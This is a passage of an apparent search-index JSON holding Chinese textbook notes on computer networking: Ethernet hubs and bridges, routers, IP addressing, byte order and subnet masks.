DMA \u200b\u4f20\u9001\u200b. \u200b\u7c7b\u4f3c\u200b\u5730\u200b, \u200b\u6570\u636e\u200b\u4e5f\u200b\u80fd\u200b\u4ece\u200b\u5185\u5b58\u200b\u590d\u5236\u5230\u200b\u7f51\u7edc\u200b.</p> <p></p> <p>\u200b\u7269\u7406\u200b\u4e0a\u200b\u800c\u8a00\u200b, \u200b\u7f51\u7edc\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6309\u7167\u200b\u5730\u7406\u200b\u8fdc\u8fd1\u200b\u7ec4\u6210\u200b\u7684\u200b\u5c42\u6b21\u200b\u7cfb\u7edf\u200b. \u200b\u6700\u4f4e\u200b\u5c42\u200b\u662f\u200b LAN(Local Area Network, \u200b\u5c40\u57df\u7f51\u200b), \u200b\u5728\u200b\u4e00\u4e2a\u200b\u5efa\u7b51\u200b\u6216\u8005\u200b\u6821\u56ed\u200b\u8303\u56f4\u200b\u5185\u200b. \u200b\u76ee\u524d\u200b\u6700\u200b\u6d41\u884c\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u6280\u672f\u200b\u662f\u200b\u4ee5\u592a\u7f51\u200b (Ethernet).</p> <p>\u200b\u4ee5\u592a\u7f51\u200b\u6bb5\u200b\u5305\u62ec\u200b\u4e00\u4e9b\u200b\u7535\u7f06\u200b\u548c\u200b\u4e00\u4e2a\u200b\u53eb\u505a\u200b\u96c6\u7ebf\u5668\u200b\u7684\u200b\u5c0f\u76d2\u5b50\u200b, \u200b\u4ee5\u592a\u7f51\u200b\u6bb5\u200b\u901a\u5e38\u200b\u8de8\u8d8a\u200b\u4e00\u4e9b\u200b\u5c0f\u200b\u7684\u200b\u533a\u57df\u200b, \u200b\u6bcf\u6839\u200b\u7535\u7f06\u200b\u90fd\u200b\u6709\u200b\u76f8\u540c\u200b\u7684\u200b\u6700\u5927\u200b\u4f4d\u200b\u5e26\u5bbd\u200b. \u200b\u4e00\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e3b\u673a\u200b\u7684\u200b\u9002\u914d\u5668\u200b, \u200b\u53e6\u4e00\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b\u96c6\u7ebf\u5668\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\u4e0a\u200b. \u200b\u96c6\u7ebf\u5668\u200b\u4e0d\u200b\u52a0\u200b\u5206\u8fa8\u200b\u4f4e\u200b\u5c06\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\u4e0a\u200b\u6536\u5230\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u4f4d\u200b\u590d\u5236\u5230\u200b\u5176\u4ed6\u200b\u6240\u6709\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e0a\u200b. \u200b\u56e0\u6b64\u200b\u6bcf\u53f0\u200b\u4e3b\u673a\u200b\u90fd\u200b\u80fd\u200b\u770b\u5230\u200b\u6bcf\u4e2a\u200b\u4f4d\u200b.</p> <p>\u200b\u6bcf\u4e2a\u200b\u4ee5\u592a\u7f51\u200b\u7684\u200b\u9002\u914d\u5668\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5168\u7403\u200b\u552f\u4e00\u200b\u7684\u200b 48 \u200b\u4f4d\u200b\u5730\u5740\u200b (MAC\u200b\u5730\u5740\u200b), \u200b\u5b58\u50a8\u200b\u5728\u200b\u9002\u914d\u5668\u200b\u7684\u200b\u975e\u6613\u200b\u5931\u6027\u200b\u5b58\u50a8\u5668\u200b\u4e0a\u200b. \u200b\u4e00\u53f0\u200b\u4e3b\u673a\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b\u4e00\u6bb5\u200b\u4f4d\u200b(\u200b\u79f0\u4e3a\u200b\u5e27\u200b)\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u7f51\u6bb5\u200b\u5185\u200b\u7684\u200b\u5176\u4ed6\u200b\u4efb\u4f55\u200b\u4e3b\u673a\u200b. \u200b\u6bcf\u4e2a\u200b\u5e27\u200b\u5305\u62ec\u200b\u4e00\u4e9b\u200b\u56fa\u5b9a\u200b\u6570\u91cf\u200b\u7684\u200b\u5934\u90e8\u200b(header)\u200b\u4f4d\u200b, \u200b\u7528\u6765\u200b\u6807\u8bc6\u200b\u6b64\u5e27\u200b\u7684\u200b\u6e90\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4ee5\u53ca\u200b\u6b64\u5e27\u200b\u7684\u200b\u957f\u5ea6\u200b. \u200b\u6b64\u540e\u200b\u7d27\u968f\u200b\u7684\u200b\u5c31\u662f\u200b\u6570\u636e\u200b\u4e3a\u200b\u7684\u200b\u6709\u6548\u8f7d\u8377\u200b (payload). \u200b\u6bcf\u4e2a\u200b\u4e3b\u673a\u200b\u9002\u914d\u5668\u200b\u90fd\u200b\u80fd\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u5e27\u200b, \u200b\u4f46\u662f\u200b\u53ea\u6709\u200b\u76ee\u7684\u200b\u4e3b\u673a\u200b\u5b9e\u9645\u200b\u8bfb\u53d6\u200b\u5b83\u200b.</p> <p>\u200b\u96c6\u7ebf\u5668\u200b\u7684\u200b\u95ee\u9898\u200b</p> <ul> <li>\u200b\u96c6\u7ebf\u5668\u200b\u662f\u200b\u7269\u7406\u5c42\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5b83\u200b\u6536\u5230\u200b\u4e00\u4e2a\u200b\u5e27\u200b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u65e0\u8111\u200b\u5730\u200b\u5c06\u200b\u5176\u200b\u5e7f\u64ad\u200b\u7ed9\u200b\u6240\u6709\u200b\u8fde\u63a5\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002</li> <li>\u200b\u6b64\u65f6\u200b\uff0c\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u6240\u6709\u200b\u4e3b\u673a\u200b\u786e\u5b9e\u200b\u90fd\u200b\u80fd\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u5e27\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b\u5e27\u200b\u7684\u200b\u76ee\u7684\u200b MAC \u200b\u5730\u5740\u200b\u4e0d\u662f\u200b\u81ea\u5df1\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9664\u4e86\u200b\u76ee\u7684\u200b\u4e3b\u673a\u200b\u5916\u200b\uff0c\u200b\u5176\u4ed6\u200b\u4e3b\u673a\u200b\u90fd\u200b\u4f1a\u200b\u4e22\u5f03\u200b\u5b83\u200b\u3002\u200b\u4f46\u200b\u5982\u679c\u200b\u6709\u4eba\u200b\u6076\u610f\u200b\u4f7f\u7528\u200b\u7f51\u7edc\u200b\u55c5\u63a2\u5668\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u622a\u83b7\u200b\u5e76\u200b\u8bfb\u53d6\u200b\u8fd9\u4e9b\u200b\u6570\u636e\u200b\u3002</li> </ul> <p>\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u7535\u7f06\u200b\u548c\u200b\u53eb\u505a\u200b\u7f51\u6865\u200b\u7684\u200b\u5c0f\u76d2\u5b50\u200b, \u200b\u591a\u4e2a\u200b\u4ee5\u592a\u7f51\u200b\u6bb5\u200b\u53ef\u4ee5\u200b\u8fde\u63a5\u6210\u200b\u8f83\u5927\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b, \u200b\u79f0\u4e3a\u200b\u6865\u63a5\u200b\u4ee5\u592a\u7f51\u200b (bridged Ethernet), \u200b\u6865\u63a5\u200b\u4ee5\u592a\u7f51\u200b\u80fd\u591f\u200b\u8de8\u8d8a\u200b\u6574\u4e2a\u200b\u5efa\u7b51\u7269\u200b\u6216\u8005\u200b\u6821\u533a\u200b. \u200b\u5728\u200b\u6865\u63a5\u200b\u4ee5\u592a\u7f51\u200b\u91cc\u200b, \u200b\u4e00\u4e9b\u200b\u7535\u7f06\u200b\u8fde\u63a5\u200b\u7f51\u6865\u200b\u4e0e\u200b\u7f51\u6865\u200b, \u200b\u800c\u200b\u53e6\u5916\u200b\u4e00\u4e9b\u200b\u8fde\u63a5\u200b\u7f51\u6865\u200b\u548c\u200b\u96c6\u7ebf\u5668\u200b.</p> <p></p> <p>\u200b\u7f51\u6865\u200b\u6bd4\u200b\u96c6\u7ebf\u5668\u200b\u66f4\u200b\u5145\u5206\u200b\u5730\u200b\u5229\u7528\u200b\u4e86\u200b\u7535\u7f06\u200b\u5e26\u5bbd\u200b\u3002\u200b\u5229\u7528\u200b\u4e00\u79cd\u200b\u806a\u660e\u200b\u7684\u200b\u5206\u914d\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5b83\u4eec\u200b\u968f\u7740\u200b\u65f6\u95f4\u200b\u81ea\u52a8\u200b\u5b66\u4e60\u200b\u54ea\u4e2a\u200b\u4e3b\u673a\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u54ea\u4e2a\u200b\u7aef\u53e3\u200b\u53ef\u200b\u8fbe\u200b\uff0c\u200b\u7136\u540e\u200b\u53ea\u200b\u5728\u200b\u6709\u200b\u5fc5\u8981\u200b\u65f6\u200b\uff0c\u200b\u6709\u200b\u9009\u62e9\u5730\u200b\u5c06\u200b\u5e27\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\u590d\u5236\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5982\u679c\u200b\u4e3b\u673a\u200bA\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u5e27\u200b\u5230\u200b\u540c\u200b\u7f51\u6bb5\u200b\u4e0a\u200b\u7684\u200b\u4e3b\u673a\u200bB\uff0c\u200b\u5f53\u8be5\u200b\u5e27\u200b\u5230\u8fbe\u200b\u7f51\u6865\u200bX\u200b\u7684\u200b\u8f93\u5165\u200b\u7aef\u53e3\u200b\u65f6\u200b\uff0cX\u200b\u5c31\u200b\u5c06\u200b\u4e22\u5f03\u200b\u6b64\u5e27\u200b\uff0c\u200b\u56e0\u800c\u200b\u8282\u7701\u200b\u4e86\u200b\u5176\u4ed6\u200b\u7f51\u6bb5\u200b\u4e0a\u200b\u7684\u200b\u5e26\u5bbd\u200b\u3002\u200b\u7136\u800c\u200b\uff0c\u200b\u5982\u679c\u200b\u4e3b\u673a\u200bA\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u5e27\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u200b\u7f51\u6bb5\u200b\u4e0a\u200b\u7684\u200b\u4e3b\u673a\u200bC\uff0c\u200b\u90a3\u4e48\u200b\u7f51\u6865\u200bX\u200b\u53ea\u4f1a\u200b\u628a\u200b\u6b64\u200b\u5e27\u200b\u590d\u5236\u5230\u200b\u548c\u200b\u7f51\u6865\u200bY\u200b\u76f8\u8fde\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e0a\u200b\uff0c\u200b\u7f51\u6865\u200bY\u200b\u4f1a\u200b\u53ea\u200b\u628a\u200b\u6b64\u200b\u5e27\u200b\u590d\u5236\u5230\u200b\u4e0e\u200b\u4e3b\u673a\u200bC\u200b\u7684\u200b\u7f51\u6bb5\u200b\u8fde\u63a5\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u591a\u4e2a\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u53eb\u505a\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u7279\u6b8a\u200b\u8ba1\u7b97\u673a\u200b\u8fde\u63a5\u8d77\u6765\u200b, \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b internet(\u200b\u4e92\u8054\u7f51\u7edc\u200b). \u200b\u6bcf\u53f0\u200b\u8def\u7531\u5668\u200b\u5bf9\u4e8e\u200b\u5b83\u200b\u6240\u200b\u8fde\u63a5\u200b\u5230\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7f51\u7edc\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u9002\u914d\u5668\u200b(\u200b\u7aef\u53e3\u200b). \u200b\u8def\u7531\u5668\u200b\u4e5f\u200b\u80fd\u200b\u8fde\u63a5\u200b\u9ad8\u901f\u200b\u70b9\u5230\u70b9\u200b\u7535\u8bdd\u200b\u94fe\u63a5\u200b, \u200b\u8fd9\u662f\u200b\u79f0\u4e3a\u200b WAN(Wide-Area Network, \u200b\u5e7f\u57df\u7f51\u200b)\u200b\u7684\u200b\u7f51\u7edc\u200b\u793a\u4f8b\u200b.</p> <p></p> <p>\u200b\u4e92\u8054\u7f51\u7edc\u200b\u81f3\u5173\u91cd\u8981\u200b\u7684\u200b\u7279\u6027\u200b\u662f\u200b\u80fd\u591f\u200b\u91c7\u7528\u200b\u5b8c\u5168\u200b\u4e0d\u540c\u200b\u548c\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u6280\u672f\u200b\u7684\u200b\u5404\u79cd\u200b\u5c40\u57df\u7f51\u200b\u548c\u200b\u5e7f\u57df\u7f51\u200b\u7ec4\u6210\u200b. \u200b\u6bcf\u53f0\u200b\u4e3b\u673a\u200b\u548c\u200b\u5176\u4ed6\u200b\u6bcf\u53f0\u200b\u4e3b\u673a\u200b\u90fd\u200b\u662f\u200b\u7269\u7406\u200b\u76f8\u8fde\u200b\u7684\u200b. \u200b\u5982\u4f55\u200b\u80fd\u591f\u200b\u8ba9\u200b\u67d0\u200b\u53f0\u6e90\u200b\u4e3b\u673a\u200b\u8de8\u8fc7\u200b\u6240\u6709\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u7684\u200b\u7f51\u7edc\u200b\u53d1\u9001\u6570\u636e\u200b\u4f4d\u5230\u200b\u53e6\u4e00\u53f0\u200b\u76ee\u7684\u200b\u4e3b\u673a\u200b\u5462\u200b?</p> <p>\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b Protocol. \u200b\u534f\u8bae\u200b\u63a7\u5236\u200b\u4e3b\u673a\u200b\u548c\u200b\u8def\u7531\u5668\u200b\u5982\u4f55\u200b\u534f\u540c\u5de5\u4f5c\u200b\u6765\u200b\u5b9e\u73b0\u200b\u6570\u636e\u4f20\u8f93\u200b, \u200b\u8fd9\u79cd\u200b\u534f\u8bae\u200b\u5fc5\u987b\u200b\u63d0\u4f9b\u200b\u4e24\u79cd\u200b\u57fa\u672c\u200b\u80fd\u529b\u200b:</p> <ul> <li>\u200b\u547d\u540d\u200b\u673a\u5236\u200b: \u200b\u4e0d\u540c\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u6280\u672f\u200b\u6709\u200b\u4e0d\u540c\u200b\u548c\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6765\u200b\u4e3a\u200b\u4e3b\u673a\u200b\u5206\u914d\u200b\u5730\u5740\u200b. \u200b\u4e92\u8054\u7f51\u7edc\u200b\u534f\u8bae\u200b\u901a\u8fc7\u200b\u5b9a\u4e49\u200b\u4e00\u79cd\u200b\u4e00\u81f4\u200b\u7684\u200b\u4e3b\u673a\u200b\u5730\u5740\u200b\u683c\u5f0f\u200b\u6d88\u9664\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u5dee\u5f02\u200b. \u200b\u6bcf\u53f0\u4e3b\u200b\u673a\u4f1a\u200b\u88ab\u200b\u5206\u914d\u200b\u81f3\u5c11\u200b\u4e00\u4e2a\u200b\u8fd9\u79cd\u200b\u4e92\u8054\u7f51\u7edc\u200b\u5730\u5740\u200b(\u200b\u901a\u5e38\u200b\u6307\u200b IP\u200b\u5730\u5740\u200b), \u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\u552f\u4e00\u200b\u5730\u200b\u6807\u8bc6\u200b\u4e86\u200b\u8fd9\u53f0\u200b\u4e3b\u673a\u200b.</li> <li>\u200b\u4f20\u9001\u200b\u673a\u5236\u200b. \u200b\u4e92\u8054\u7f51\u7edc\u200b\u534f\u8bae\u200b\u901a\u8fc7\u200b\u5b9a\u4e49\u200b\u4e00\u79cd\u200b\u628a\u200b\u6570\u636e\u4f4d\u200b\u6346\u624e\u200b\u6210\u200b\u4e0d\u200b\u8fde\u7eed\u200b\u7684\u200b\u5305\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4f20\u9001\u6570\u636e\u200b. \u200b\u5305\u5934\u200b\u5305\u62ec\u200b\u5305\u200b\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u76ee\u7684\u200b\u4e3b\u673a\u200b\u7684\u200b\u5730\u5740\u200b, \u200b\u6709\u6548\u8f7d\u8377\u200b\u5305\u62ec\u200b\u4ece\u6e90\u200b\u4e3b\u673a\u200b\u53d1\u51fa\u200b\u7684\u200b\u6570\u636e\u4f4d\u200b.</li> </ul> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#113-ip","title":"11.3 \u200b\u5168\u7403\u200b IP \u200b\u56e0\u7279\u7f51","text":"<p> \u200b\u6bcf\u53f0\u200b\u56e0\u7279\u7f51\u200b\u4e3b\u673a\u200b\u90fd\u200b\u8fd0\u884c\u200b\u5b9e\u73b0\u200b TCP/IP \u200b\u534f\u8bae\u200b\u7684\u200b\u8f6f\u4ef6\u200b. \u200b\u56e0\u7279\u7f51\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u6df7\u5408\u200b\u4f7f\u7528\u200b\u5957\u200b\u63a5\u5b57\u200b\u63a5\u53e3\u51fd\u6570\u200b\u548c\u200b Unix I/O \u200b\u51fd\u6570\u200b\u6765\u200b\u8fdb\u884c\u200b\u901a\u4fe1\u200b. \u200b\u901a\u5e38\u200b\u5c06\u200b\u5957\u200b\u63a5\u5b57\u200b\u51fd\u6570\u200b\u5b9e\u73b0\u200b\u4e3a\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b, \u200b\u8fd9\u4e9b\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u4f1a\u200b\u9677\u5165\u200b\u5185\u6838\u200b, \u200b\u5e76\u200b\u8c03\u7528\u200b\u5404\u79cd\u200b\u5185\u6838\u200b\u6a21\u5f0f\u200b\u7684\u200b TCP/IP \u200b\u51fd\u6570\u200b.</p> \u200b\u534f\u8bae\u200b \u200b\u5c42\u7ea7\u200b \u200b\u4f20\u8f93\u200b\u76ee\u6807\u200b \u200b\u4f20\u8f93\u200b\u7279\u6027\u200b \u200b\u4f5c\u7528\u200b IP \u200b\u7f51\u7edc\u5c42\u200b (L3) \u200b\u4e3b\u673a\u200b\u5230\u200b\u4e3b\u673a\u200b \u200b\u4e0d\u200b\u53ef\u9760\u200b\u3001\u200b\u65e0\u200b\u8fde\u63a5\u200b \u200b\u63d0\u4f9b\u200b\u57fa\u672c\u200b\u7684\u200b\u8def\u7531\u200b\u548c\u200b\u5bfb\u5740\u200b UDP \u200b\u4f20\u8f93\u5c42\u200b (L4) \u200b\u8fdb\u7a0b\u200b\u5230\u200b\u8fdb\u7a0b\u200b \u200b\u4e0d\u200b\u53ef\u9760\u200b\u3001\u200b\u65e0\u200b\u8fde\u63a5\u200b \u200b\u4e3a\u200b\u5e94\u7528\u200b\u8fdb\u7a0b\u200b\u63d0\u4f9b\u200b\u6700\u5c0f\u200b\u5f00\u9500\u200b\u7684\u200b\u4f20\u8f93\u670d\u52a1\u200b TCP \u200b\u4f20\u8f93\u5c42\u200b (L4) \u200b\u8fdb\u7a0b\u200b\u5230\u200b\u8fdb\u7a0b\u200b \u200b\u53ef\u9760\u200b\u3001\u200b\u9762\u5411\u200b\u8fde\u63a5\u200b \u200b\u786e\u4fdd\u200b\u6570\u636e\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\u548c\u200b\u987a\u5e8f\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u5e94\u7528\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u53ef\u9760\u200b\u670d\u52a1\u200b <p>\u200b\u4ece\u200b\u7a0b\u5e8f\u5458\u200b\u7684\u200b\u89d2\u5ea6\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u628a\u200b\u56e0\u7279\u7f51\u200b\u770b\u505a\u200b\u4e00\u4e2a\u200b\u4e16\u754c\u200b\u8303\u56f4\u200b\u7684\u200b\u4e3b\u673a\u200b\u96c6\u5408\u200b, \u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u7279\u6027\u200b:</p> <ul> <li>\u200b\u4e3b\u673a\u200b\u96c6\u5408\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e3a\u200b\u4e00\u7ec4\u200b 32 \u200b\u4f4d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b.</li> <li>\u200b\u8fd9\u7ec4\u200b IP \u200b\u5730\u5740\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e3a\u200b\u4e00\u7ec4\u200b\u79f0\u4e3a\u200b\u56e0\u7279\u7f51\u200b\u57df\u540d\u200b\u7684\u200b\u6807\u8bc6\u7b26\u200b</li> <li>\u200b\u56e0\u7279\u7f51\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u80fd\u591f\u200b\u901a\u8fc7\u200b\u8fde\u63a5\u200b\u548c\u200b\u4efb\u4f55\u200b\u5176\u4ed6\u200b\u56e0\u7279\u7f51\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u901a\u4fe1\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1131-ip","title":"11.3.1 IP \u200b\u5730\u5740","text":"<p>32\u200b\u4f4d\u200b\u65e0\u200b\u7b26\u53f7\u200b\u6574\u6570\u200b TCP/IP \u200b\u4e3a\u200b\u4efb\u610f\u200b\u6574\u6570\u200b\u6570\u636e\u9879\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u7edf\u4e00\u200b\u7684\u200b\u7f51\u7edc\u200b\u5b57\u8282\u200b\u987a\u5e8f\u200b(\u200b\u5927\u7aef\u6cd5\u200b), \u200b\u4f8b\u5982\u200b IP \u200b\u5730\u5740\u200b, \u200b\u5b83\u200b\u653e\u5728\u200b\u5305\u5934\u200b\u4e2d\u200b\u8de8\u8fc7\u200b\u7f51\u7edc\u200b\u88ab\u200b\u643a\u5e26\u200b. \u200b\u5728\u200b IP \u200b\u5730\u5740\u200b\u7ed3\u6784\u200b\u4e2d\u200b\u5b58\u653e\u200b\u7684\u200b\u5730\u5740\u200b\u603b\u662f\u200b\u4ee5\u5927\u7aef\u200b\u6cd5\u200b\u7f51\u7edc\u200b\u5b57\u8282\u200b\u987a\u5e8f\u200b\u5b58\u653e\u200b\u7684\u200b, \u200b\u5373\u4f7f\u200b\u4e3b\u673a\u200b\u5b57\u8282\u200b\u987a\u5e8f\u200b\u662f\u200b\u5c0f\u7aef\u6cd5\u200b. Unix \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0b\u9762\u200b\u7684\u200b\u51fd\u6570\u200b\u5b9e\u73b0\u200b\u987a\u5e8f\u200b\u8f6c\u6362\u200b.</p> <p></p> <p>IP \u200b\u5730\u5740\u200b\u901a\u5e38\u200b\u662f\u200b\u4ee5\u200b\u4e00\u79cd\u200b\u79f0\u4e3a\u200b\u70b9\u5206\u200b\u5341\u8fdb\u5236\u200b\u8868\u793a\u6cd5\u200b\u6765\u200b\u8868\u793a\u200b\u7684\u200b, \u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\u7531\u200b\u5b83\u200b\u7684\u200b\u5341\u8fdb\u5236\u200b\u8868\u793a\u200b, \u200b\u5e76\u4e14\u200b\u7528\u200b\u53e5\u70b9\u200b\u548c\u200b\u5176\u4ed6\u200b\u5b57\u8282\u200b\u95f4\u200b\u5206\u5f00\u200b. \u200b\u4f8b\u5982\u200b <code>128.2.194.242</code> \u200b\u5c31\u662f\u200b\u5730\u5740\u200b <code>0x8002c2f2</code> \u200b\u7684\u200b\u70b9\u5206\u200b\u5341\u8fdb\u5236\u200b\u8868\u793a\u200b. \u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b HOSTNAME \u200b\u547d\u4ee4\u200b\u786e\u5b9a\u200b\u4e3b\u673a\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b.</p> <p>\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u901a\u8fc7\u200b inet_pton \u200b\u548c\u200b inet_ntop \u200b\u51fd\u6570\u200b\u6765\u200b\u5b9e\u73b0\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u70b9\u5206\u200b\u5341\u8fdb\u5236\u200b\u4e32\u200b\u4e4b\u95f4\u200b\u7684\u200b\u8f6c\u6362\u200b. </p> <p>\u200b\u4e3b\u673a\u200b\u53ef\u80fd\u200b\u6709\u200b\u5f88\u591a\u200b\u63a5\u53e3\u200b, \u200b\u6bcf\u4e2a\u200b\u63a5\u53e3\u200b\u90fd\u200b\u53ef\u80fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b. \u200b\u591a\u4e2a\u200b\u4e3b\u673a\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e00\u4e2a\u200b\u516c\u7f51\u200b IP \u200b\u5730\u5740\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#_1","title":"\u5b50\u7f51","text":"<p>\u200b\u5b50\u7f51\u200b\u662f\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b, \u200b\u5b83\u4eec\u200b\u63a5\u53e3\u200b\u53ef\u4ee5\u200b\u7269\u7406\u200b\u4e0a\u200b\u5730\u200b\u8fde\u63a5\u200b\u800c\u200b\u4e0d\u7528\u200b\u901a\u8fc7\u200b\u8def\u7531\u5668\u200b. \u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u5b50\u7f51\u200b\u5185\u200b\uff0c\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u5b83\u4eec\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u6570\u636e\u200b\u5e27\u200b\u7684\u200b\u8f6c\u53d1\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b L3\uff08\u200b\u7f51\u7edc\u5c42\u200b\uff09\u200b\u7684\u200b\u8def\u7531\u200b\u529f\u80fd\u200b.</p> <p>\u200b\u5b50\u7f51\u200b\u662f\u200b IP \u200b\u5730\u5740\u200b\u7ed3\u6784\u5316\u200b\u5bfb\u5740\u200b\u7684\u200b\u4f53\u73b0\u200b\u3002\u200b\u4e00\u4e2a\u200b IP \u200b\u5730\u5740\u200b\u88ab\u200b\u903b\u8f91\u200b\u4e0a\u200b\u5212\u5206\u200b\u6210\u200b\u4e86\u200b\u4e24\u200b\u90e8\u5206\u200b\uff1a</p> <ul> <li> <p>\u200b\u5b50\u7f51\u200b\u90e8\u5206\u200b (subnet part)\uff1a</p> <ul> <li> <p>\u200b\u7531\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u4f4d\u200b\u6bd4\u7279\u200b\uff08common high order bits) \u200b\u6784\u6210\u200b\u3002</p> </li> <li> <p>\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u5b50\u7f51\u200b\u5185\u200b\u7684\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u5b50\u7f51\u200b\u90e8\u5206\u200b\u5fc5\u987b\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u3002</p> </li> <li> <p>\u200b\u8fd9\u90e8\u5206\u200b\u5730\u5740\u200b\u7531\u200b \u200b\u5b50\u7f51\u63a9\u7801\u200b (Subnet Mask) \u200b\u6765\u200b\u754c\u5b9a\u200b\u3002</p> </li> </ul> </li> <li> <p>\u200b\u4e3b\u673a\u200b\u90e8\u5206\u200b (host part)\uff1a</p> <ul> <li> <p>\u200b\u7531\u200b IP \u200b\u5730\u5740\u200b\u5269\u4f59\u200b\u7684\u200b\u4f4e\u4f4d\u200b\u6bd4\u7279\u200b (remaining low order bits) \u200b\u6784\u6210\u200b\u3002</p> </li> <li> <p>\u200b\u8fd9\u90e8\u5206\u200b\u7528\u4e8e\u200b\u552f\u4e00\u200b\u6807\u8bc6\u200b\u8be5\u200b\u5b50\u7f51\u200b\u5185\u200b\u7684\u200b\u7279\u5b9a\u200b\u4e3b\u673a\u200b\u3002</p> </li> </ul> </li> </ul> <p>\u200b\u4f8b\u5982\u200b, 223.1.3.0/24 \u200b\u8bf4\u660e\u200b\u9ad8\u200b 24 \u200b\u4f4d\u662f\u200b\u5b50\u7f51\u200b\u90e8\u5206\u200b, \u200b\u4f4e\u200b 8 \u200b\u4f4d\u662f\u200b\u4e3b\u673a\u200b\u90e8\u5206\u200b. \u200b\u5b50\u7f51\u63a9\u7801\u200b\u5c31\u662f\u200b 255.255.255.0.</p> <p>\u200b\u5168\u200b 0 \u200b\u548c\u200b\u5168\u200b 1 \u200b\u7684\u200b\u4e3b\u673a\u200b\u90e8\u5206\u200b</p> <p>\u200b\u5728\u200b IPv4 